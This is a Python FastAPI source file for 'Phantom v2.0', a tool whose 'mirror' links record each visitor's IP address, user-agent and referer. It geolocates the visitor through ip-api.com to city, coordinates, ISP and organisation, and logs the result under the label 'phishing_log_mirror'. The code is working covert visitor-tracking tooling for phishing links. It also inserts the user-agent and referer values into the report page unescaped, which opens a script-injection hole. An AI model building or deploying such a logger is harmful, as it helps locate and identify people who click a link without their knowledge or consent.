from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import datetime
import json
import db
import aiohttp

app = FastAPI()

@app.get("/mirror/{path}")
async def mirror_log(request: Request, path: str):
    mirror = db.get_mirror(path)
    if not mirror:
        return HTMLResponse("<h1>404 — Зеркало не найдено</h1>", status_code=404)
    
    db.increment_mirror_visits(path)
    
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")
    
    geo = {}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                geo = await resp.json()
    except:
        geo = {"status": "fail", "message": "Не удалось определить"}
    
    log_entry = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "mirror": path,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_log_mirror", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))
    
    if geo.get("status") == "success":
        country = geo.get("country", "—")
        region = geo.get("regionName", "—")
        city = geo.get("city", "—")
        isp = geo.get("isp", "—")
        org = geo.get("org", "—")
        lat = geo.get("lat", "—")
        lon = geo.get("lon", "—")
        timezone = geo.get("timezone", "—")
    else:
        country = region = city = isp = org = lat = lon = timezone = "—"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Phantom — отчёт</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                background: #0b0e14;
                font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
                color: #e0e0e0;
            }}
            .container {{
                max-width: 720px;
                width: 100%;
                background: #1a1f2b;
                border-radius: 20px;
                padding: 35px 40px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.8);
                border: 1px solid #2a3142;
            }}
            .header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid #2a3142;
                padding-bottom: 15px;
                margin-bottom: 20px;
            }}
            .header h1 {{
                font-weight: 600;
                font-size: 28px;
                background: linear-gradient(135deg, #6c8cff, #a78bfa);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }}
            .badge {{
                background: #2a3142;
                color: #b0b8c8;
                padding: 6px 14px;
                border-radius: 30px;
                font-size: 14px;
                font-weight: 500;
            }}
            .info-grid {{
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 12px 20px;
                margin: 20px 0;
            }}
            .info-item {{
                display: flex;
                flex-direction: column;
                background: #121724;
                padding: 12px 16px;
                border-radius: 12px;
                border-left: 3px solid #4a6cf7;
            }}
            .info-item .label {{
                font-size: 11px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                color: #8892a8;
                margin-bottom: 4px;
            }}
            .info-item .value {{
                font-size: 16px;
                font-weight: 500;
                color: #f0f4ff;
                word-break: break-word;
            }}
            .full-width {{
                grid-column: 1 / -1;
            }}
            .footer {{
                margin-top: 30px;
                border-top: 1px solid #2a3142;
                padding-top: 18px;
                display: flex;
                justify-content: space-between;
                font-size: 13px;
                color: #6b7a93;
            }}
            .footer span {{
                background: #121724;
                padding: 4px 12px;
                border-radius: 20px;
            }}
            .mirror-note {{
                background: #1f2a3a;
                border-radius: 10px;
                padding: 12px 18px;
                margin-top: 15px;
                font-size: 14px;
                color: #a0b3d0;
                border: 1px dashed #3a4a66;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🕵️ Phantom</h1>
                <span class="badge">зеркало: {path}</span>
            </div>
            <div class="info-grid">
                <div class="info-item"><span class="label">🌐 IP-адрес</span><span class="value">{client_ip}</span></div>
                <div class="info-item"><span class="label">📍 Страна</span><span class="value">{country}</span></div>
                <div class="info-item"><span class="label">🏙️ Регион</span><span class="value">{region}</span></div>
                <div class="info-item"><span class="label">🗺️ Город</span><span class="value">{city}</span></div>
                <div class="info-item"><span class="label">🧭 Координаты</span><span class="value">{lat}, {lon}</span></div>
                <div class="info-item"><span class="label">🕒 Часовой пояс</span><span class="value">{timezone}</span></div>
                <div class="info-item full-width"><span class="label">🏢 Провайдер (ISP)</span><span class="value">{isp}</span></div>
                <div class="info-item full-width"><span class="label">📋 Организация</span><span class="value">{org}</span></div>
                <div class="info-item full-width"><span class="label">🖥️ User‑Agent</span><span class="value" style="font-size:13px;">{user_agent}</span></div>
                <div class="info-item full-width"><span class="label">🔗 Реферер</span><span class="value" style="font-size:13px;">{referer}</span></div>
            </div>
            <div class="mirror-note">
                ⚡ Данные зафиксированы и сохранены в лог-системе Phantom.
                Время отчёта: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
            <div class="footer">
                <span>⚡ Phantom v2.0</span>
                <span>посещений зеркала: {mirror[3]}</span>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
